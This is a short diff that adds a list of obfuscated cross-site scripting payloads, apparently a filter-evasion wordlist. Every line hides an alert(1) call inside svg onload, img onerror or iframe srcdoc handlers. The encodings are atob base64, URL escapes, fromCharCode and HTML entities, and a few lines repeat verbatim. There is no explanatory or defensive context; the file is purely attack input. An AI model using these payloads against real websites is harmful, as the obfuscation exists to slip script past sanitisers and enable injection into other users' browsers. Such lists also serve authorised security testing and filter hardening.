@@ -1,0 +1,16 @@
+<svg onload=window[unescape('%61%6c%65%72%74')](1)>
+<iframe srcdoc="<svg onload=window[atob('YWxlcnQ=')](1)>"></iframe>
+<svg onload=setTimeout('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)',0)>
+<iframe srcdoc="<img src=x onerror=setTimeout(decodeURIComponent('%61%6C%65%72%74(1)'),0)>"></iframe>
+<svg onload=eval(unescape('%61%6c%65%72%74(1)'))>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload=setTimeout('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)',0)>
+<svg onload=window[atob('YWx'+'lcnQ=')](1)>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=window[decodeURIComponent('%61%6C%65%72%74')](1)>
+<iframe srcdoc="<svg onload=window[atob('YWx'+'lcnQ=')](1)>"></iframe>
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
